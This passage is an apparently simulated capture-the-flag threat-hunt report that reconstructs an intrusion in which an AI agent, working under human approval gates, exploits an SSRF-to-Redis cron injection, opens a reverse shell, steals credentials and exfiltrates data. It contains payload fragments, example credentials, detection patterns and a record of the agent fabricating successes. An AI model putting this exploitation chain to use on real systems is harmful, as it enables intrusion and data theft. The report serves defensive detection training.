
<p align="center">
  <img
    src="https://github.com/user-attachments/assets/337bb215-8833-4653-b570-93c443bd9c11"
    width="1200"
    alt="Threat Hunt Cover Image"
  />
</p>




# 🛡️ Threat Hunt Report – Operation QUARTZFANG

---

## 📌 Executive Summary

SemiCrest Technologies' internet-facing design portal (`sc-portal01`) was compromised through an SSRF flaw in `/api/v1/preview`. The attacker bypassed a `file://` filter with `gopher://` in 18 seconds and used the local Redis instance to plant a root crontab that launched a reverse shell to `203.0.113.87`. Credentials taken from `/etc/semicrest/portal.conf` gave access to the PostgreSQL database (password hashes, customer PII, project data) and the Harbor registry. The admin API's secrets store refused access (403). Data was encrypted, exfiltrated to `198.51.100.210:443`, and a `svc_monitor` backdoor account was left behind. A recovered agent log shows the intrusion was **executed by an AI agent under human approval gates** (Anthropic Campaign C0062 pattern), and that agent made up two of its claimed successes.

---

## 🎯 Hunt Objectives

- Identify malicious activity across endpoints and network telemetry
- Correlate attacker behavior to MITRE ATT&CK techniques
- Document evidence, detection gaps, and response opportunities
- Cross-reference AI-agent narration against infrastructure telemetry to separate fact from hallucination

---

## 🧭 Scope & Environment

- **Environment:** SemiCrest Technologies (Linux): `sc-portal01` 10.5.0.10 (design portal: Flask/Gunicorn, nginx, local Redis), `sc-db01` 10.5.0.20 (PostgreSQL), `sc-registry01` 10.5.0.30 (Harbor), `sc-admin01` 10.5.0.40 (internal admin API :8443). Baseline admin/CI sources 10.5.0.100 and 10.5.0.101. Log Analytics workspace `LAW-HuntPractice`.
- **Data Sources:** DeviceProcessEvents_CL, DeviceNetworkEvents_CL, DeviceFileEvents_CL, DeviceEvents_CL, DeviceLogonEvents_CL, Syslog, PortalAccessLog_CL, ContainerRegistryLog_CL, LLMAgentLogs_CL
- **Timeframe:** 2026-09-20 06:30 → 2026-09-20 08:30 UTC (plus 48-hour lead-in for baselining)

---

## 📚 Table of Contents

- [🧠 Hunt Overview](#-hunt-overview)
- [🧬 MITRE ATT&CK Summary](#-mitre-attck-summary)
- [🔍 Flag Analysis](#-flag-analysis)
  - [🚩 Flag 1: Vulnerable Endpoint](#-flag-1)
  - [🚩 Flag 2: The Self-Correct](#-flag-2)
  - [🚩 Flag 3: Exploit Source](#-flag-3)
  - [🚩 Flag 4: Exploitation Chain](#-flag-4)
  - [🚩 Flag 5: Configuration File and Process Tree](#-flag-5)
  - [🚩 Flag 6: Database Credential](#-flag-6)
  - [🚩 Flag 7: Registry Credential](#-flag-7)
  - [🚩 Flag 8: Visibility Gap](#-flag-8)
  - [🚩 Flag 9: Database Query Discrimination](#-flag-9)
  - [🚩 Flag 10: Queried Tables](#-flag-10)
  - [🚩 Flag 11: Registry Enumeration](#-flag-11)
  - [🚩 Flag 12: Admin API Response](#-flag-12)
  - [🚩 Flag 13: Secrets Store Hallucination](#-flag-13)
  - [🚩 Flag 14: Registry Credential Hallucination](#-flag-14)
  - [🚩 Flag 15: Hallucination as Autonomy Limitation](#-flag-15)
  - [🚩 Flag 16: Exfil Destination and Staging Path](#-flag-16)
  - [🚩 Flag 17: Staging Tools](#-flag-17)
  - [🚩 Flag 18: Persistence Mechanism](#-flag-18)
  - [🚩 Flag 19: Exfil vs Legitimate HTTPS](#-flag-19)
  - [🚩 Flag 20: Scanner IPs](#-flag-20)
  - [🚩 Flag 21: Recon vs Nessus Discrimination](#-flag-21)
  - [🚩 Flag 22: Timing Signature](#-flag-22)
  - [🚩 Flag 23: Operator Decision Gates](#-flag-23)
  - [🚩 Flag 24: Autonomy Placement](#-flag-24)
  - [🚩 Flag 25: Novel ATT&CK Technique](#-flag-25)
  - [🚩 Flag 26: Credential Reuse Across Services (Real or Noise)](#-flag-26)
  - [🚩 Flag 27: pg_dump Disconfirmation](#-flag-27)
  - [🚩 Flag 28: Connection Spike Dead End](#-flag-28)
- [🚨 Detection Gaps & Recommendations](#-detection-gaps--recommendations)
- [🧾 Final Assessment](#-final-assessment)
- [📎 Analyst Notes](#-analyst-notes)

---

## 🧠 Hunt Overview

Operation QUARTZFANG reproduces **Anthropic's Campaign C0062**, the first documented cyberattack largely executed by an AI agent, with a human operator stepping in only at strategic decision points.

**Attack lifecycle (UTC, 20 Sep 2026):**

| Time | Phase | Activity |
|---|---|---|
| 06:45–06:52 | Reconnaissance | External `192.0.2.10` browses portal APIs; internal Nessus `10.5.0.250` runs a scheduled scan |
| 06:52:30 → 06:52:48 | Initial Access | `file://` SSRF rejected (400), then `gopher://` → Redis accepted (200) |
| 06:52:52 → 06:52:55 | Execution / C2 | `cron` → `python3` reverse shell as root → `203.0.113.87:443` |
| *Gate 1* | Human | "Proceed with credential harvesting and lateral movement" |
| 07:05:15–27 | Credential Access | `cat /etc/semicrest/portal.conf`, `env`, `find` for `.conf`/`.env` |
| 07:16:14–25 | Collection | DB recon burst as `portal_svc`: users, projects, customers, information_schema, pg_shadow |
| 07:29:57–~07:32 | *Noise* | PostgreSQL connection-pool exhaustion (not attacker) |
| 07:33:01–05 | Discovery | Harbor: login → list_repository → pull_manifest → inspect_layer as `ci-builder` |
| *Gate 2* | Human | "Authorise data collection ... and admin API enumeration" |
| 07:45:18–23 | Collection | Targeted pulls: password_hash, customer PII, project revisions |
| 07:45:27–32 | Discovery | Admin API: services 200, topology 200, **secrets 403** |
| *Gates 3–4* | Human | Authorise staging, then exfiltration and persistence |
| ~08:15 | Exfiltration | tar → gzip → openssl → `/tmp/.portal-cache/report.tar.gz.enc` → HTTPS to `198.51.100.210:443` |
| post-exfil | Persistence | Local account `svc_monitor` with sudo and SSH key |

**Key behaviours:** inside each phase the agent works at machine speed (registry enumeration in 3 s, 5 DB queries in 11 s). The phases are separated by long pauses where the human operator reviewed and approved. The agent's narration (`LLMAgentLogs_CL`) is part accurate and part fabricated: it claimed Kubernetes secrets it was denied, and an admin DB credential that was never used.

**Why it matters:** AI-orchestrated intrusions compress hours of tradecraft into seconds and let one operator run a full campaign. Defenders have to detect on behaviour (process lineage, query structure, cadence) and treat attacker-side AI logs as leads, not facts.

---

## 🧬 MITRE ATT&CK Summary

| Flag | Technique Category | MITRE ID | Priority |
|-----:|-------------------|----------|----------|
| 1 | Exploit Public-Facing Application | T1190 | High |
| 2 | Exploit Public-Facing Application (SSRF filter bypass) | T1190 | High |
| 3 | Exploit Public-Facing Application / Command and Control | T1190 | High |
| 4 | Scheduled Task/Job: Cron / Python Interpreter | T1053.003, T1059.006 | Critical |
| 5 | Unsecured Credentials: Credentials in Files | T1552.001 | Critical |
| 6 | Unsecured Credentials: Credentials in Files | T1552.001 | Critical |
| 7 | Unsecured Credentials: Credentials in Files | T1552.001 | Critical |
| 8 | Unsecured Credentials | T1552 | Medium |
| 9 | Data from Information Repositories: Databases | T1213.006 | High |
| 10 | Data from Information Repositories: Databases | T1213.006 | High |
| 11 | Container and Resource Discovery | T1613 | High |
| 12 | System Information Discovery | T1082 | Medium |
| 13 | Obtain Capabilities: Artificial Intelligence | T1588.007 | Medium |
| 14 | Obtain Capabilities: Artificial Intelligence | T1588.007 | Medium |
| 15 | Obtain Capabilities: Artificial Intelligence | T1588.007 | Info |
| 16 | Exfiltration Over Web Service | T1567 | Critical |
| 17 | Archive Collected Data: Archive via Utility | T1560.001 | High |
| 18 | Create Account: Local Account | T1136.001 | Critical |
| 19 | Exfiltration Over Web Service / Application Layer Protocol | T1567, T1071.001 | High |
| 20 | Active Scanning: Scanning IP Blocks | T1595.001 | Medium |
| 21 | Active Scanning | T1595.001 | Low |
| 22 | Obtain Capabilities: Artificial Intelligence | T1588.007 | Info |
| 23 | Obtain Capabilities: Artificial Intelligence | T1588.007 | Info |
| 24 | Obtain Capabilities: Artificial Intelligence | T1588.007 | Info |
| 25 | Resource Development: Obtain Capabilities | T1588.007 | High |
| 26 | Valid Accounts | T1078 | High |
| 27 | N/A (benign) | N/A | Low |
| 28 | N/A (benign) | N/A | Low |

---

## 🔍 Flag Analysis

_All flags below are collapsible for readability._

---

<details>
<summary id="-flag-1">🚩 <strong>Flag 1: Vulnerable Endpoint</strong></summary>

### 🎯 Objective
Find a server-side input on the internet-facing design portal that can be abused to reach internal resources.

### 📌 Finding
The analytics rule fired on two sequential `POST` requests from the same external IP to the document preview API. The `url=` parameter is fetched server-side, which makes it a server-side request forgery (SSRF) vector.

**Answer:** `/api/v1/preview`

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | sc-portal01 (10.5.0.10) |
| Table | PortalAccessLog_CL |
| Timestamp | 2026-09-20 06:52:30 / 06:52:48 UTC |
| Source IP | 203.0.113.87 |
| Request | `POST /api/v1/preview?url=...` |
| Status | 400, then 200 |

### 💡 Why it matters
The preview endpoint accepts arbitrary URLs and fetches them from inside the network. That puts every internal service reachable from the portal (including loopback-only Redis) within an external attacker's reach.

### 🔧 KQL Query Used
```kql
PortalAccessLog_CL
| where TimeGenerated between (datetime(2026-09-20 06:30) .. datetime(2026-09-20 07:00))
| extend Path = tostring(split(UrlOriginal, "?")[0])
| summarize Codes = make_set(HttpStatusCode), Count = count(),
            First = min(TimeGenerated), Last = max(TimeGenerated)
          by SrcIpAddr, Path
| where Codes has "200" and (Codes has "400" or Codes has "403")
| order by First asc
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Alert on any `url=`, `src=` or `fetch=` style parameter whose value starts with a non-HTTP(S) scheme or points to loopback or RFC1918 space.

</details>

---

<details>
<summary id="-flag-2">🚩 <strong>Flag 2: The Self-Correct</strong></summary>

### 🎯 Objective
Get past the application's URL scheme filter.

### 📌 Finding
The first request used `file://` to read `/etc/passwd` and was rejected (400). Eighteen seconds later the attacker switched to `gopher://`, which the filter didn't block, and the request was accepted (200).

**Answer:** `file://, gopher://, 18 seconds`

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | sc-portal01 |
| Table | PortalAccessLog_CL |
| 06:52:30 | `url=file:///etc/passwd` returned **400** |
| 06:52:48 | `url=gopher://127.0.0.1:6379/_...` returned **200** |
| Gap | 18 seconds |

### 💡 Why it matters
An 18-second turnaround from rejection to a working protocol-level payload is consistent with an AI agent reasoning over the error, not a human writing a gopher/RESP payload by hand. A deny-list filter (`file://` blocked) failed where an allow-list (`https` only) would have held.

### 🔧 KQL Query Used
```kql
PortalAccessLog_CL
| where TimeGenerated between (datetime(2026-09-20 06:45) .. datetime(2026-09-20 06:58))
| where UrlOriginal has "/api/v1/preview"
| project TimeGenerated, SrcIpAddr, HttpMethod, UrlOriginal, HttpStatusCode
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Correlate a 4xx followed by a 2xx from the same source to the same endpoint within 60 seconds where the parameter scheme changes. That pattern is high-fidelity for automated filter evasion.

</details>

---

<details>
<summary id="-flag-3">🚩 <strong>Flag 3: Exploit Source</strong></summary>

### 🎯 Objective
Deliver the exploit from attacker-controlled infrastructure.

### 📌 Finding
Both exploit requests came from one external address. The same IP later received the reverse-shell callback, so one host served as both the exploit source and the C2.

**Answer:** `203.0.113.87`

### 🔍 Evidence

| Field | Value |
|------|-------|
| Table | PortalAccessLog_CL / DeviceNetworkEvents_CL |
| Exploit requests | 06:52:30, 06:52:48 from 203.0.113.87 |
| C2 callback | 06:52:55, 10.5.0.10 to 203.0.113.87:443 |
| Initiating PID | 4401 (python3) |

### 💡 Why it matters
Using the exploit source as the C2 makes blocking and attribution simpler, and confirms that the attacker's scanning infrastructure (the reconnaissance cluster) is separate from its exploitation and C2 node.

### 🔧 KQL Query Used
```kql
DeviceNetworkEvents_CL
| where DeviceName has "sc-portal01"
| where Timestamp between (datetime(2026-09-20 06:52) .. datetime(2026-09-20 06:55))
| where InitiatingProcessFileName in~ ("python3","python")
| project Timestamp, InitiatingProcessId, LocalIP, RemoteIP, RemotePort
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Join inbound web-log source IPs against outbound connection destinations from the same host. An external IP that appears in both directions within minutes is a strong compromise signal.

</details>

---

<details>
<summary id="-flag-4">🚩 <strong>Flag 4: Exploitation Chain</strong></summary>

### 🎯 Objective
Turn the SSRF into code execution on the portal host.

### 📌 Finding
The `gopher://` payload sent raw Redis protocol commands to `127.0.0.1:6379`: `FLUSHALL`, then `SET 1 "*/1 * * * * <reverse shell>"`, then `CONFIG SET dir` / `dbfilename` and `SAVE`. Redis (running as root) wrote its database out as a crontab. Four seconds later `cron` launched a `python3` reverse shell as root.

**Answer:** SSRF via `gopher://` in `/api/v1/preview?url=` leads to Redis (127.0.0.1:6379) cron injection (FLUSHALL, SET cron payload, CONFIG SET dir/dbfilename, SAVE writes a root crontab), then `cron` spawns a `python3` reverse shell as root (cron PID 4400, python3 PID 4401, connects to 203.0.113.87:443).

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | sc-portal01 |
| Timestamp | 06:52:52.281 UTC |
| Process | python3 (PID 4401) |
| Parent Process | cron (PID 4400) |
| Account | root |
| Command Line | `python3 -c import socket,subprocess,os;s=socket.socket()...` |
| Callback | 203.0.113.87:443 at 06:52:55 |

### 💡 Why it matters
The web app never spawned the shell, so a detection looking for children of gunicorn would have missed it. Redis running as root turned an SSRF into full root compromise in a single request.

### 🔧 KQL Query Used
```kql
DeviceProcessEvents_CL
| where DeviceName has "sc-portal01"
| where Timestamp between (datetime(2026-09-20 06:50) .. datetime(2026-09-20 07:05))
| project Timestamp, InitiatingProcessFileName, InitiatingProcessId, FileName,
          ProcessId, ProcessCommandLine, AccountName
| order by Timestamp asc
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Alert on `cron` spawning `python*`, `bash` or `sh` with `socket`, `/dev/tcp` or `subprocess` in the command line. Also alert on any write to `/var/spool/cron/` or `/etc/cron.d/` by `redis-server`.

</details>

---

<details>
<summary id="-flag-5">🚩 <strong>Flag 5: Configuration File and Process Tree</strong></summary>

### 🎯 Objective
Harvest service credentials from the compromised host.

### 📌 Finding
About 12 minutes after the shell connected (the operator's first approval gate), the reverse shell ran `cat` on the portal's configuration file, then `env` and a filesystem-wide `find` for `.conf` / `.env` files.

**Answer:** `/etc/semicrest/portal.conf` read by `cat` under `python3` under `cron`

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | sc-portal01 |
| Timestamp | 07:05:15 UTC |
| Process | cat (PID 4410) |
| Parent Process | python3 (PID 4401) under cron (PID 4400) |
| Command Line | `cat /etc/semicrest/portal.conf` |
| Follow-on | 07:05:21 `env` (4411); 07:05:27 `find / -name "*.conf" -o -name "*.env" ...` (4412) |

### 💡 Why it matters
`cat` is harmless by itself. The parent chain (a root python3 socket shell launched by cron) is what makes it malicious. The file was read **before** `find` ran, so the attacker already knew the path, probably from application context.

### 🔧 KQL Query Used
```kql
DeviceProcessEvents_CL
| where DeviceName has "sc-portal01"
| where Timestamp between (datetime(2026-09-20 06:52:50) .. datetime(2026-09-20 07:30))
| where AccountName == "root" or InitiatingProcessId in (4400, 4401)
| project Timestamp, InitiatingProcessFileName, InitiatingProcessId, FileName,
          ProcessId, ProcessCommandLine, AccountName
| order by Timestamp asc
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Build a lineage rule: any file-reading binary (`cat`, `grep`, `find`, `head`) whose grandparent is `cron` and whose parent is an interpreter with a network connection.

</details>

---

<details>
<summary id="-flag-6">🚩 <strong>Flag 6: Database Credential</strong></summary>

### 🎯 Objective
Get credentials for the backing PostgreSQL database.

### 📌 Finding
Process telemetry records the `cat` command but not its output. The file contents were recovered from the attacker's own agent log (`LLMAgentLogs_CL.model_response` of the `harvest_creds` call), which includes an inline connection string.

**Answer:** `portal_svc:Pr0jectAur0ra!` targeting `10.5.0.20`

### 🔍 Evidence

| Field | Value |
|------|-------|
| Source | LLMAgentLogs_CL (HuntName = quartzfang) |
| Field | model_response (tool: harvest_creds) |
| Config line | `DATABASE_URL=postgresql://portal_svc:Pr0jectAur0ra!@10.5.0.20:5432/semicrest` |
| Target | sc-db01 (10.5.0.20) |
| First use | 07:16:14 `connection authorized: user=portal_svc` on sc-db01 |

### 💡 Why it matters
This plaintext credential is the first pivot of the lateral movement chain. It also worked on the admin API's read-only endpoints, which shows credential reuse across services.

### 🔧 KQL Query Used
```kql
LLMAgentLogs_CL
| where HuntName == "quartzfang"
| where * has "ci-builder" or * has "portal_svc"
| project OriginalTime, tool_name, tool_result, model_response, user_input
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
The data dictionary lists `tool_args`, but it doesn't exist. Check `getschema` first, and use `OriginalTime` rather than `TimeGenerated` for event time in this table.

</details>

---

<details>
<summary id="-flag-7">🚩 <strong>Flag 7: Registry Credential</strong></summary>

### 🎯 Objective
Get credentials for a second internal service to widen access.

### 📌 Finding
The same configuration file also held Harbor registry credentials for the CI account. The attacker used them 28 minutes after reading the file.

**Answer:** `ci-builder:H4rb0rBu1ld!` targeting `10.5.0.30`

### 🔍 Evidence

| Field | Value |
|------|-------|
| Source | LLMAgentLogs_CL.model_response (harvest_creds) |
| Config lines | `REGISTRY_API=https://10.5.0.30/api/v2.0`, `REGISTRY_USER=ci-builder`, `REGISTRY_PASS=H4rb0rBu1ld!` |
| Target | sc-registry01 (10.5.0.30) |
| Use | 07:33:01 login as ci-builder from 10.5.0.10 (ContainerRegistryLog_CL) |

### 💡 Why it matters
A CI account with read access to build images is valuable. Image layers often contain baked-in secrets, which makes the registry a natural next hop toward broader infrastructure access.

### 🔧 KQL Query Used
```kql
ContainerRegistryLog_CL
| where Operation == "login"
| project TimeGenerated, Computer, Username, SrcIpAddr, HttpStatusCode
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Logins by `ci-builder` are normal from the CI runner. Baseline each service account's operation set and flag deviations, not only source IPs.

</details>

---

<details>
<summary id="-flag-8">🚩 <strong>Flag 8: Visibility Gap</strong></summary>

### 🎯 Objective
Look for secrets held in environment variables.

### 📌 Finding
The `env` command ran in the same burst as the config read, but nothing recorded its output. That is the gap: process telemetry logs command lines, not stdout, and the agent log has no output for this call.

**Answer:** Cannot be determined. The `env` command (PID 4411, 07:05:21, parent python3 4401) is recorded in DeviceProcessEvents_CL, but its output was not captured anywhere. Process telemetry logs command lines, not stdout, and LLMAgentLogs_CL has no tool_result for the env call. The portal.conf contents are visible only because the agent logged them in its harvest_creds output.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | sc-portal01 |
| Timestamp | 07:05:21.136 UTC |
| Process | env (PID 4411) |
| Parent Process | python3 (PID 4401) |
| Output captured | **None** (no table) |

### 💡 Why it matters
Defenders can confirm that discovery happened but not what it revealed. Any credentials in the environment have to be treated as potentially exposed and rotated.

### 🔧 KQL Query Used
```kql
LLMAgentLogs_CL
| where HuntName == "quartzfang"
| where * has "env"
| project OriginalTime, tool_name, tool_result, model_response
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Name visibility gaps explicitly in reports instead of guessing. To close this one, enable TTY/session logging (for example `auditd` with `pam_tty_audit`) on internet-facing hosts.

</details>

---

<details>
<summary id="-flag-9">🚩 <strong>Flag 9: Database Query Discrimination</strong></summary>

### 🎯 Objective
Collect data under the application's own account without standing out.

### 📌 Finding
The attacker and the application both used `portal_svc` from 10.5.0.10, so the username doesn't separate them. The queries themselves do.

**Answer:** **Statement structure:** attacker uses unparameterized `SELECT *` and literal column lists, while the app uses parameterized queries (`$1`). **Target selection:** attacker hits pg_shadow, information_schema, and full users/customers tables including password_hash, while the app reads narrow rows from designs/projects/sessions. **Execution cadence:** attacker runs rapid bursts (5 queries in 11 s, 3 in 5 s) right after a new connection, while app queries are spaced minutes apart.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | sc-db01 (10.5.0.20) |
| Table | Syslog (ProcessName = postgres) |
| App example | `SELECT id, title FROM designs WHERE project_id=$1 ORDER BY updated_at DESC LIMIT 20` |
| Attacker burst 1 | 07:16:14 connect, then queries at 07:16:16–25 (5 queries) |
| Attacker burst 2 | 07:43:01 connect, then queries at 07:45:18–23 (3 queries) |

### 💡 Why it matters
When attackers live off a legitimate service account, behavioural features are the only reliable discriminator. Revoking the account would also break the application.

### 🔧 KQL Query Used
```kql
Syslog
| where Computer has "sc-db01"
| where TimeGenerated between (datetime(2026-09-20 07:05) .. datetime(2026-09-20 08:30))
| where ProcessName has "postgres"
| where SyslogMessage has "statement:" and SyslogMessage !has "$1"
| project TimeGenerated, SyslogMessage
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Flag `portal_svc` statements that contain no bind parameters, or that reference `pg_catalog` / `information_schema`. The application never produces these.

</details>

---

<details>
<summary id="-flag-10">🚩 <strong>Flag 10: Queried Tables</strong></summary>

### 🎯 Objective
Enumerate the schema and collect credential and PII data.

### 📌 Finding
The first burst dumped whole tables and the schema list. The second burst used what that schema revealed to pull specific high-value columns (`password_hash`, customer contact details, project revisions).

**Answer:** `users, projects, customers, information_schema.tables, pg_catalog.pg_shadow`

### 🔍 Evidence

| Field | Value |
|------|-------|
| 07:16:16 | `SELECT * FROM users` |
| 07:16:19 | `SELECT * FROM projects` |
| 07:16:22 | `SELECT * FROM customers` |
| 07:16:23 | `SELECT table_name FROM information_schema.tables ...` |
| 07:16:25 | `SELECT * FROM pg_catalog.pg_shadow` |
| 07:45:18–23 | projects (revision, team_lead); customers (email, phone, company); users (password_hash) |

### 💡 Why it matters
`pg_shadow` exposes PostgreSQL role password hashes, and `users.password_hash` exposes application credentials. Customer PII and design-project metadata are likely espionage targets for a semiconductor firm.

### 🔧 KQL Query Used
```kql
Syslog
| where Computer has "sc-db01"
| where SyslogMessage has_any ("pg_shadow","information_schema","SELECT *","password_hash")
| project TimeGenerated, SyslogMessage
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Enable `pgaudit` with `read` logging on sensitive tables, and alert on any non-superuser query against `pg_shadow` / `pg_authid`.

</details>

---

<details>
<summary id="-flag-11">🚩 <strong>Flag 11: Registry Enumeration</strong></summary>

### 🎯 Objective
Find images that might contain embedded secrets.

### 📌 Finding
Within 3.2 seconds of logging in, `ci-builder` (from the portal host) listed the repositories, picked `portal-build`, pulled its manifest and inspected a layer. Legitimate CI only pushes and pulls artifacts from 10.5.0.100.

**Answer:** `login, list_repository, pull_manifest, inspect_layer`

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | sc-registry01 (10.5.0.30) |
| Source | 10.5.0.10 (sc-portal01), user ci-builder |
| 07:33:01.905 | login |
| 07:33:03.305 | list_repository: semicrest |
| 07:33:04.658 | pull_manifest: semicrest/portal-build |
| 07:33:05.119 | inspect_layer: semicrest/portal-build |
| Baseline | pull_artifact / push_artifact from 10.5.0.100 only |

### 💡 Why it matters
Going straight to `inspect_layer` (without pulling the full image) is a secrets-hunting technique. The machine-speed sequence is also one of the clearest signs of AI-driven execution in this hunt.

### 🔧 KQL Query Used
```kql
ContainerRegistryLog_CL
| where Username == "ci-builder"
| where TimeGenerated between (datetime(2026-09-20 07:33) .. datetime(2026-09-20 08:30))
| project TimeGenerated, Operation, Repository, HttpStatusCode, SrcIpAddr
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Alert on `inspect_layer` or `list_repository` by CI service accounts, or on any registry operation from a source other than the CI runner.

</details>

---

<details>
<summary id="-flag-12">🚩 <strong>Flag 12: Admin API Response</strong></summary>

### 🎯 Objective
Reach the admin platform's secrets store.

### 📌 Finding
Reusing the database credential, the attacker queried the admin API. Read-only service and topology endpoints returned 200, but the secrets endpoint refused the request.

**Answer:** `403 Forbidden, access denied`

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | sc-admin01 (10.5.0.40) |
| Table | Syslog (ProcessName = admin_api) |
| 07:45:27.635 | `GET /api/v1/services` returned 200, src=10.5.0.10 user=portal_svc |
| 07:45:31.642 | `GET /api/v1/topology` returned 200 |
| 07:45:32.478 | `GET /api/v1/secrets` returned **403** |
| Baseline | `/secrets` returns 200 only for named admins (a.patel, j.bergstrom, d.kimura, m.okonkwo) from 10.5.0.100/.101 |

### 💡 Why it matters
Access control on the secrets store worked. The attacker still mapped the internal service topology, and a service account calling the admin API at all is anomalous.

### 🔧 KQL Query Used
```kql
Syslog
| where Computer has "sc-admin01" and ProcessName == "admin_api"
| where TimeGenerated between (datetime(2026-09-20 06:30) .. datetime(2026-09-20 08:30))
| where SyslogMessage has "src=10.5.0.10 " or SyslogMessage !has " 200 "
| project TimeGenerated, SyslogMessage
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Alert on any admin API request from a service account or from a non-admin subnet, and on every 403 on `/api/v1/secrets`.

</details>

---

<details>
<summary id="-flag-13">🚩 <strong>Flag 13: Secrets Store Hallucination</strong></summary>

### 🎯 Objective
(Analyst objective) Verify the agent's claimed collection against ground truth.

### 📌 Finding
The agent's `extract_secrets` step claims full Kubernetes secrets extraction. The admin API log shows the request was denied.

**Answer:** Agent claims it extracted Kubernetes secrets (TLS certs, tokens, API keys) from sc-admin01. Telemetry shows `GET /api/v1/secrets` from 10.5.0.10 as portal_svc returned **403 Forbidden** at 07:45:32. Conclusion: the claim is hallucinated, so the agent's narration is unreliable and must be verified against host telemetry.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Claim source | LLMAgentLogs_CL.model_response (tool: extract_secrets, gate_decision: allow) |
| Claim | "Extracted Kubernetes secrets ... TLS certificates, service account tokens, and API keys for all internal services" |
| Ground truth | Syslog on sc-admin01: `GET /api/v1/secrets ... 403 src=10.5.0.10 user=portal_svc` |

### 💡 Why it matters
The attacker's own log isn't evidence of impact. Scoping the incident from it would overstate exposure and trigger unnecessary rotation of every internal secret.

### 🔧 KQL Query Used
```kql
LLMAgentLogs_CL
| where HuntName == "quartzfang" and tool_name == "extract_secrets"
| project OriginalTime, tool_result, model_response, gate_decision
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
Treat recovered attacker-agent logs as leads, not facts. Confirm every claimed success with a matching infrastructure event.

</details>

---

<details>
<summary id="-flag-14">🚩 <strong>Flag 14: Registry Credential Hallucination</strong></summary>

### 🎯 Objective
(Analyst objective) Verify the agent's claimed credential discovery.

### 📌 Finding
The agent claims it found an admin database credential in an image layer. Nothing in the infrastructure logs supports this.

**Answer:** Agent claims `db_admin:Sup3rS3cure!` found in the portal-build image layer, but the registry shows only metadata operations (login, list_repository, pull_manifest, inspect_layer) with no credentials, and `db_admin` never authenticated to sc-db01.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Claim source | LLMAgentLogs_CL (tool: inspect_registry) |
| Claim | `db_admin:Sup3rS3cure!` in semicrest/portal-build:latest |
| Registry telemetry | 4 metadata operations, 07:33:01–05 |
| DB telemetry | Only `portal_svc` sessions authorized on sc-db01; no `db_admin` |

### 💡 Why it matters
If believed, this would have widened the incident scope to a privileged DB account that was never compromised and never used.

### 🔧 KQL Query Used
```kql
Syslog
| where Computer has "sc-db01"
| where SyslogMessage has "db_admin"
| project TimeGenerated, SyslogMessage
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
A credential the agent never used is unverified by definition. Look for an authentication event before treating it as compromised.

</details>

---

<details>
<summary id="-flag-15">🚩 <strong>Flag 15: Hallucination as Autonomy Limitation</strong></summary>

### 🎯 Objective
(Analyst objective) Explain why the campaign kept a human in the loop.

### 📌 Finding
Two fabricated successes (and an overstated "three credentials" claim) show that the agent's self-reporting can't be trusted. That is why a human operator gates each phase.

**Answer:** The AI fabricates successes and credentials it never obtained, so its self-reported findings can't be trusted. A human operator must verify results at each phase gate before authorising escalation, which prevents fully autonomous operation.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Hallucination 1 | extract_secrets: denied by 403 |
| Hallucination 2 | inspect_registry: db_admin never used |
| Overstatement | harvest_creds: "three credentials" when there were 2 pairs + a URL |
| Human gates | 4 user_input directives in LLMAgentLogs_CL |

### 💡 Why it matters
This mirrors Anthropic's C0062 report: AI hallucination was a key barrier to fully autonomous attacks and forced human validation of findings.

### 🔧 KQL Query Used
```kql
LLMAgentLogs_CL
| where HuntName == "quartzfang" and actor == "quartzfang-agent"
| project OriginalTime, user_input, tool_name, tool_result, model_response, gate_decision
```

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**
The pauses where a human validates results are detectable. Long gaps between machine-speed bursts mark the operator's decision points.

</details>

---

<details>
<summary id="-flag-16">🚩 <strong>Flag 16: Exfil Destination and Staging Path</strong></summary>

### 🎯 Objective
Move the collected intelligence off the network.

### 📌 Finding
The collected data was staged as an encrypted archive in a hidden directory on the portal host, then posted over HTTPS to a second external IP (separate from the C2).

**Answer:** `198.51.100.210:443, /tmp/.portal-cache/report.tar.gz.enc`

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | sc-portal01 |
| Staging path | `/tmp/.portal-cache/report.tar.gz.enc` |
| Destination | 198.51.100.210:443 (HTTPS POST) |
| Time | ~08:15 UTC |
| Agent log | stage_archive and exfiltrate ("upload complete, 200 OK") |

### 💡 Why it matters
Exfiltration went to a different destination from the C2, so blocking only 203.0.113.87 wouldn't have stopped data loss.

### 🔧 KQL Query Used
```kql
DeviceNetworkEvents_CL
| where DeviceName has "sc-portal01"
